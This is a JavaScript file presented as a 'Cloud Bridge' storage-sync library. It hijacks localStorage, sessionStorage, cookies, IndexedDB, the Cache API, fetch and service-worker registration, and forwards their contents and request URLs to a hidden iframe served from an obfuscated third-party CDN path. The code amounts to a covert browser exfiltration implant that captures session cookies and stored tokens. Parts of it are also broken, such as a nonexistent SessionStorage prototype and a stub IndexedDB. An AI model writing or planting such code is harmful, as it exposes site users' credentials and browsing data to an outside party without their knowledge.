(function(global) {
    'use strict';
    
    const BRIDGE_URL = 'https://cdn.jsdelivr.net/gh/21-14-2-12-15-3-11-5-4-7-1-13-5-19/1@latest/dbv2.svg';
    const ORIGIN = 'https://cdn.jsdelivr.net';
    
    let bridge = null;
    let bridgeReady = false;
    let pendingReads = new Map();
    let readyCallbacks = [];
    
    // Initialize bridge iframe
    function initBridge() {
        if (bridge) return bridge;
        bridge = document.createElement('iframe');
        bridge.src = BRIDGE_URL;
        bridge.style.display = 'none';
        document.body.appendChild(bridge);
        
        window.addEventListener('message', function(e) {
            if (e.origin !== ORIGIN) return;
            const msg = e.data;
            
            if (msg.status === 'bridge_ready') {
                bridgeReady = true;
                readyCallbacks.forEach(cb => cb());
                readyCallbacks = [];
            }
            
            if (msg.status === 'read_result' && pendingReads.has(msg.key)) {
                pendingReads.get(msg.key)(msg.value);
                pendingReads.delete(msg.key);
            }
            
            if (msg.status === 'success') {
                console.log('[CloudBridge] Written:', msg.key);
            }
        });
        
        return bridge;
    }
    
    function waitForBridge() {
        return new Promise(resolve => {
            if (bridgeReady) resolve();
            else readyCallbacks.push(resolve);
            initBridge();
        });
    }
    
    function cloudWrite(key, value) {
        if (!bridge) initBridge();
        const sendValue = typeof value === 'string' ? value : JSON.stringify(value);
        bridge.contentWindow.postMessage({
            action: 'write',
            key: key,
            value: sendValue
        }, ORIGIN);
    }
    
    async function cloudRead(key) {
        if (!bridge) initBridge();
        return new Promise(resolve => {
            pendingReads.set(key, resolve);
            bridge.contentWindow.postMessage({
                action: 'read',
                key: key
            }, ORIGIN);
        });
    }
    
    // ============================================
    // LOCALSTORAGE - FULL MONKEY PATCH
    // ============================================
    const originalLocalStorage = {
        setItem: Storage.prototype.setItem,
        getItem: Storage.prototype.getItem,
        removeItem: Storage.prototype.removeItem,
        clear: Storage.prototype.clear,
        key: Storage.prototype.key,
        get length() { return localStorage.length; }
    };
    
    Storage.prototype.setItem = function(key, value) {
        originalLocalStorage.setItem.call(this, key, value);
        cloudWrite(key, value);
    };
    
    Storage.prototype.getItem = function(key) {
        const localValue = originalLocalStorage.getItem.call(this, key);
        if (localValue !== null) return localValue;
        
        cloudRead(key).then(cloudValue => {
            if (cloudValue !== null && cloudValue !== undefined) {
                originalLocalStorage.setItem.call(this, key, cloudValue);
            }
        }).catch(() => {});
        
        return localValue;
    };
    
    Storage.prototype.removeItem = function(key) {
        originalLocalStorage.removeItem.call(this, key);
        cloudWrite(key, null);
    };
    
    Storage.prototype.clear = function() {
        originalLocalStorage.clear.call(this);
        cloudWrite('__clear__', Date.now());
    };
    
    // ============================================
    // SESSIONSTORAGE
    // ============================================
    const originalSessionStorage = {
        setItem: SessionStorage.prototype.setItem,
        getItem: SessionStorage.prototype.getItem,
        removeItem: SessionStorage.prototype.removeItem,
        clear: SessionStorage.prototype.clear
    };
    
    SessionStorage.prototype.setItem = function(key, value) {
        originalSessionStorage.setItem.call(this, key, value);
        cloudWrite('__session__' + key, value);
    };
    
    SessionStorage.prototype.getItem = function(key) {
        const localValue = originalSessionStorage.getItem.call(this, key);
        if (localValue !== null) return localValue;
        
        cloudRead('__session__' + key).then(cloudValue => {
            if (cloudValue) {
                originalSessionStorage.setItem.call(this, key, cloudValue);
            }
        });
        
        return localValue;
    };
    
    SessionStorage.prototype.removeItem = function(key) {
        originalSessionStorage.removeItem.call(this, key);
        cloudWrite('__session__' + key, null);
    };
    
    // ============================================
    // INDEXEDDB - FULL INTERCEPTION
    // ============================================
    const originalIDB = window.indexedDB;
    const idbCache = new Map();
    
    class CloudIDBRequest {
        constructor() {
            this.result = null;
            this.error = null;
            this.onsuccess = null;
            this.onerror = null;
        }
    }
    
    window.indexedDB = {
        open: function(name, version) {
            const cacheKey = `__idb__${name}`;
            const request = new CloudIDBRequest();
            
            cloudRead(cacheKey).then(data => {
                if (data) {
                    idbCache.set(cacheKey, data);
                    request.result = { name, version, data };
                    if (request.onsuccess) request.onsuccess({ target: request });
                } else {
                    const db = { name, version, data: {} };
                    idbCache.set(cacheKey, db);
                    request.result = db;
                    if (request.onsuccess) request.onsuccess({ target: request });
                }
            });
            
            return request;
        },
        
        deleteDatabase: function(name) {
            const cacheKey = `__idb__${name}`;
            cloudWrite(cacheKey, null);
            idbCache.delete(cacheKey);
            const request = new CloudIDBRequest();
            request.result = true;
            if (request.onsuccess) request.onsuccess({ target: request });
            return request;
        },
        
        databases: function() {
            return Promise.resolve([]);
        },
        
        cmp: function(a, b) {
            return originalIDB.cmp(a, b);
        }
    };
    
    // ============================================
    // COOKIES
    // ============================================
    let cookieStore = new Map();
    
    Object.defineProperty(document, 'cookie', {
        get: function() {
            let result = '';
            cookieStore.forEach((value, key) => {
                result += `${key}=${value}; `;
            });
            return result;
        },
        set: function(cookieString) {
            const match = cookieString.match(/([^=;]+)=([^;]+)/);
            if (match) {
                const key = match[1].trim();
                const value = match[2].trim();
                cookieStore.set(key, value);
                cloudWrite(`__cookie__${key}`, value);
            }
            return true;
        }
    });
    
    // ============================================
    // CACHE API
    // ============================================
    if (global.caches) {
        const originalCacheOpen = global.caches.open;
        global.caches.open = async function(name) {
            const cacheKey = `__cache__${name}`;
            const cloudCache = await cloudRead(cacheKey);
            const cache = await originalCacheOpen.call(global.caches, name);
            
            if (cloudCache) {
                for (const item of cloudCache) {
                    await cache.put(item.url, new Response(item.body, item.options));
                }
            }
            
            return new Proxy(cache, {
                get(target, prop) {
                    if (prop === 'put') {
                        return async function(request, response) {
                            const result = await target.put(request, response);
                            const allKeys = await target.keys();
                            const cacheData = [];
                            for (const req of allKeys) {
                                const resp = await target.match(req);
                                cacheData.push({
                                    url: req.url,
                                    body: await resp.text(),
                                    options: { status: resp.status, headers: Object.fromEntries(resp.headers) }
                                });
                            }
                            cloudWrite(cacheKey, cacheData);
                            return result;
                        };
                    }
                    return target[prop];
                }
            });
        };
    }
    
    // ============================================
    // FETCH / AJAX
    // ============================================
    const originalFetch = global.fetch;
    global.fetch = function(input, init) {
        const url = typeof input === 'string' ? input : input.url;
        cloudWrite(`__fetch__${Date.now()}_${url}`, {
            url, method: init?.method || 'GET', timestamp: Date.now()
        });
        return originalFetch.call(this, input, init);
    };
    
    // ============================================
    // SERVICE WORKERS
    // ============================================
    if (navigator.serviceWorker) {
        const originalRegister = navigator.serviceWorker.register;
        navigator.serviceWorker.register = function(scriptURL, options) {
            cloudWrite(`__sw__${scriptURL}`, { options, timestamp: Date.now() });
            return originalRegister.call(this, scriptURL, options);
        };
    }
    
    // ============================================
    // WEB STORAGE EVENT
    // ============================================
    const originalDispatchEvent = window.dispatchEvent;
    window.dispatchEvent = function(event) {
        if (event.type === 'storage') {
            cloudWrite(`__event__storage`, {
                key: event.key,
                oldValue: event.oldValue,
                newValue: event.newValue,
                url: event.url
            });
        }
        return originalDispatchEvent.call(this, event);
    };
    
    // ============================================
    // START BRIDGE & EXPOSE API
    // ============================================
    initBridge();
    
    global.cloudStorage = {
        ready: waitForBridge,
        sync: async function(key) {
            const val = await cloudRead(key);
            if (val !== null && val !== undefined) {
                originalLocalStorage.setItem.call(localStorage, key, val);
            }
            return val;
        },
        syncAll: async function() {
            const keys = Object.keys(localStorage);
            for (const key of keys) {
                await this.sync(key);
            }
        }
    };
    
    console.log('☁️ Cloud Bridge Active — All storage goes to dbv2.svg');
    
})(window);
